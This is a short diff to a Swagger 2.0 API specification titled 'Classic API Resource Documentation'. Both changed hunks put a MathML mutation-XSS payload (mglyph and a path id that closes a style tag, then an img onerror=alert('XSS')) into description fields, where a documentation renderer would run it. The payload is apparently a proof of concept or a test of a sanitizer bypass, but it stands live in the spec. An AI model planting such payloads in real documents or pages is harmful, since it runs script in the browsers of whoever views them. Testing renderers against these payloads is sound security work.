@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <math><mtext><mglyph></mglyph><a><mglyph>
+    <math><mtext><mglyph></mglyph><a><path id="</style><img onerror=alert(\'XSS\') src>"><mglyph>
 
   version: production
 basePath: /JSSResource/
@@ -28,7 +28,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <math><mtext><mglyph></mglyph><a><mglyph>
+            <math><mtext><mglyph></mglyph><a><path id="</style><img onerror=alert(\'XSS\') src>"><mglyph>
 
           format: int64
           in: path
